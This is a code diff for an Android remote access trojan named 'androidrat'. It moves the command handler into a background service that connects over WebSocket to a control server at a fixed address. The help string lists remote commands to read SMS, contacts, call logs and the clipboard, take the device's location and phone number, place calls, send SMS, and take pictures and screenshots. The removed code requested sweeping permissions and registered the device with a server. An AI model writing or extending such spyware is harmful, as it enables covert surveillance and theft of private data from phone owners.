@@ -1,89 +1,54 @@
-package com.nqmgaming.androidrat
+package com.nqmgaming.androidrat.service
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.app.Notification
+import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.Service
 import android.content.ClipDescription
 import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.hardware.camera2.CameraDevice
 import android.net.Uri
 import android.os.Build
-import android.os.Bundle
+import android.os.IBinder
 import android.telephony.TelephonyManager
-import androidx.activity.enableEdgeToEdge
 import androidx.annotation.RequiresApi
-import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import androidx.core.view.ViewCompat
-import androidx.core.view.WindowInsetsCompat
 import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationServices
+import com.nqmgaming.androidrat.R
 import com.nqmgaming.androidrat.command.DeviceInfo
-import com.nqmgaming.androidrat.data.ApiService
-import com.nqmgaming.androidrat.data.dto.DeviceDto
-import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
-import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.OkHttpClient
 import okhttp3.Request
-import okhttp3.RequestBody.Companion.toRequestBody
-import okhttp3.Response
 import okhttp3.WebSocket
 import okhttp3.WebSocketListener
+import okhttp3.Response
 import okio.ByteString
-import org.json.JSONObject
-import retrofit2.awaitResponse
-import javax.inject.Inject
 
-@AndroidEntryPoint
-class MainActivity : AppCompatActivity() {
+class WebSocketService : Service() {
 
     private lateinit var client: OkHttpClient
     private lateinit var webSocket: WebSocket
     private lateinit var fusedLocationClient: FusedLocationProviderClient
 
-    val help = "Available commands:\n" +
-            "1. help - Display this help message\n" +
-            "2. info - Display device information\n" +
-            "3. location - Get device location\n" +
-            "4. ping - Check if device is online\n" +
-            "5. phone_number - Get phone number\n" +
-            "6. read_contacts - Read contacts\n" +
-            "7. read_sms - Read SMS\n" +
-            "8. read_call_logs - Read call logs\n" +
-            "9. call - Make a call\n" +
-            "10. sms - Send SMS\n" +
-            "11. read_clipboard - Read clipboard content\n" +
-            "12. take_picture - Take a picture\n" +
-            "13. take_screen - Take a screenshot\n"
-
-
-    @Inject
-    lateinit var apiService: ApiService
-
-    @RequiresApi(Build.VERSION_CODES.M)
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        if (!arePermissionsGranted()) {
-            ActivityCompat.requestPermissions(this, APP_PERMISSION, 0)
-        }
+    @RequiresApi(Build.VERSION_CODES.O)
+    override fun onCreate() {
+        super.onCreate()
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+        // Khởi tạo WebSocket
         client = OkHttpClient()
         val request = Request.Builder().url("ws://192.168.0.199:5525").build()
         val listener = EchoWebSocketListener()
         webSocket = client.newWebSocket(request, listener)
-
-        sendRegistrationRequest()
-
     }
+
 
     private inner class EchoWebSocketListener : WebSocketListener() {
         override fun onOpen(webSocket: WebSocket, response: Response) {
@@ -96,9 +61,7 @@ class MainActivity : AppCompatActivity() {
         @SuppressLint("Range")
         @RequiresApi(Build.VERSION_CODES.M)
         override fun onMessage(webSocket: WebSocket, text: String) {
-            runOnUiThread {
-                println("Received: $text")
-            }
+            println("Received text: $text")
             when (text) {
                 "help" -> {
                     webSocket.send(help)
@@ -264,9 +227,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
-            runOnUiThread {
-                println("Received bytes: $bytes")
-            }
+            println("Received bytes: " + bytes.hex())
         }
 
         override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
@@ -279,67 +240,22 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // Request to send registration request
-    @RequiresApi(Build.VERSION_CODES.M)
-    private fun sendRegistrationRequest() {
-        val deviceInfo = DeviceInfo.getDeviceInfo()
-        val deviceDto = DeviceDto(
-            id = Build.ID,
-            name = Build.MODEL,
-            os = "Android",
-            sdk = Build.VERSION.SDK_INT,
-        )
-
-        CoroutineScope(Dispatchers.IO).launch {
-            try {
-                val response = apiService.register(deviceDto)
-                response.awaitResponse().let {
-                    if (it.isSuccessful) {
-                        println("Device registered successfully")
-                    } else {
-                        println("Failed to register device: ${it.errorBody()?.string()}")
-                    }
-                }
-            } catch (e: Exception) {
-                e.printStackTrace()
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val name = "WebSocket Service Channel"
+            val descriptionText = "Channel for WebSocket Service"
+            val importance = NotificationManager.IMPORTANCE_DEFAULT
+            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
+                description = descriptionText
             }
+            val notificationManager: NotificationManager =
+                getSystemService(NOTIFICATION_SERVICE) as NotificationManager
+            notificationManager.createNotificationChannel(channel)
         }
     }
 
-    private fun arePermissionsGranted(): Boolean {
-        return APP_PERMISSION.all { permission ->
-            ContextCompat.checkSelfPermission(
-                applicationContext,
-                permission
-            ) == PackageManager.PERMISSION_GRANTED
-        }
-    }
-
-    companion object {
-        val APP_PERMISSION = arrayOf(
-            Manifest.permission.CAMERA,
-            Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.WRITE_CONTACTS,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.REQUEST_INSTALL_PACKAGES,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE,
-            Manifest.permission.READ_SMS,
-            Manifest.permission.READ_PHONE_NUMBERS
-        )
-    }
-
-    override fun onResume() {
-        super.onResume()
-        if (!arePermissionsGranted()) {
-            ActivityCompat.requestPermissions(this, APP_PERMISSION, 0)
-        }
+    override fun onBind(intent: Intent?): IBinder? {
+        return null
     }
 
     override fun onDestroy() {
@@ -347,7 +263,21 @@ class MainActivity : AppCompatActivity() {
         webSocket.close(1000, null)
     }
 
-
+    companion object {
+        const val CHANNEL_ID = "WebSocketServiceChannel"
+        const val help = "Available commands:\n" +
+                "1. help - Display this help message\n" +
+                "2. info - Display device information\n" +
+                "3. location - Get device location\n" +
+                "4. ping - Check if device is online\n" +
+                "5. phone_number - Get phone number\n" +
+                "6. read_contacts - Read contacts\n" +
+                "7. read_sms - Read SMS\n" +
+                "8. read_call_logs - Read call logs\n" +
+                "9. call - Make a call\n" +
+                "10. sms - Send SMS\n" +
+                "11. read_clipboard - Read clipboard content\n" +
+                "12. take_picture - Take a picture\n" +
+                "13. take_screen - Take a screenshot\n"
+    }
 }
-
-
